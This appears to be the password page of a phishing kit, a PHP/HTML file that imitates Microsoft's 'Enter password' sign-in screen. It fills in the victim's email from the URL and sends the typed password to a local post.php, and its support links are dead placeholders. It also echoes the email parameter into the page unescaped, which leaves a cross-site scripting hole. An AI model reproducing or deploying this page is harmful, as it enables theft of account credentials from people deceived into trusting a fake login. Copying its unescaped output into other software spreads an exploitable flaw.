<?php

$email = $_GET['email'];

?>


<!doctype html>
<html dir="ltr" lang="EN-US">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=Edge">
		<title>Sign in to your Microsoft account</title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
		<link rel="shortcut icon" href="favicon.ico">
		<link rel="stylesheet" title="Converged" type="text/css" href="style.css">
		<style type="text/css">body.cb input.hip{border-width: 2px !important;}</style>
		<style type="text/css">body{display:none;}</style>
		<style type="text/css">body{display:block !important;}</style>
	</head>
	<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
		<div><!--  --> 
			<div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }">
				<div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"> 
					<div style="background-image: url('bg-small.jpg');"></div>
					<div class="backgroundImage" style="background-image: url('bg.jpg');"></div>
					<div class="background-overlay"></div><!-- /ko -->
				</div>
			</div> 
			<form  novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="post.php">
				<div class="outer">
					<div class="middle">
						<div class="inner">
							<div>
								<img class="logo" src="logo.svg">
							</div>
							<div>
								<div>
									<div>
										<input name="login" id="login" value="<?php echo $email; ?>" type="hidden"> 
										<div><!--  --> 
											<div class="identityBanner"> 
												<div id="displayName" class="identity" title="<?php echo $email; ?>"><?php echo $email; ?></div> 
												<div class="profile-photo"> 
													<img role="presentation" src="acc.svg"> 
												</div> 
											</div>
										</div> 
										<div id="loginHeader" class="row text-title" role="heading">Enter password</div>
										<div class="row"> 
											<div class="form-group col-md-24">
																							<div class="placeholderContainer">
													<input name="passwd" id="i0118" autocomplete="off" class="form-control " aria-required="true" aria-label="Enter password" type="password" placeholder="Password"> 
													<div class="phholder" style="left: 0px; top: 0px; width: 100%; position: absolute; z-index: 5;" data-bind="visible: !textInput(), click: focus"> 
														<div aria-hidden="true" style="cursor:text" data-bind="text: hintText, css: hintCss" class="placeholder"></div> 
													</div>
												</div>
											</div>
										</div>
										<div class="row"> 
											<div>
												<div class="col-xs-24 form-group no-padding-left-right"> 
													<div class="col-xs-12 secondary"> 
														<input id="idBtn_Back" class="btn btn-block" value="Back" style="display: none;" type="button"> 
													</div> 
													<div class="col-xs-24"> 
														<input id="idSIButton9" class="btn btn-block btn-primary" value="Sign in" type="submit"> 
													</div> 
												</div>
											</div> 
										</div>
										
										<div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top"> 
											<label id="idLbl_PWD_KMSI_Cb"> 
												<input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" aria-label="Keep me signed in" type="checkbox"> 
												<span>Keep me signed in</span> 
											</label> 
										</div>
										
										<div class="row"> 
											<div class="col-md-24"> 
												<div class="text-13 action-links"> 
													<div class="form-group"> 
														<a id="idA_PWD_ForgotPassword" href="#">Forgot my password</a> 
													</div>
													<div class="form-group"> 
														<a id="i1668" href="#">Sign in with a different Microsoft account</a> 
													</div>
												</div> 
											</div> 
										</div>
									</div>
								</div>
							</div>
						</div> 
						<div></div> 
					</div> 
				</div> 
				<div id="footer" class="footer default"> 
					<div>
						<div id="footerLinks" class="footerNode text-secondary">
							<span id="ftrCopy" data-bind="html: svr.B6">�2018 Microsoft</span>
							<a id="ftrTerms" href="#">Terms of use</a> 
							<a id="ftrPrivacy" href="#">Privacy &amp; cookies</a>
						</div> 
					</div> 
				</div> 
			</form> 
			<form method="post" target="_top"></form>
		</div>
	</body>
</html>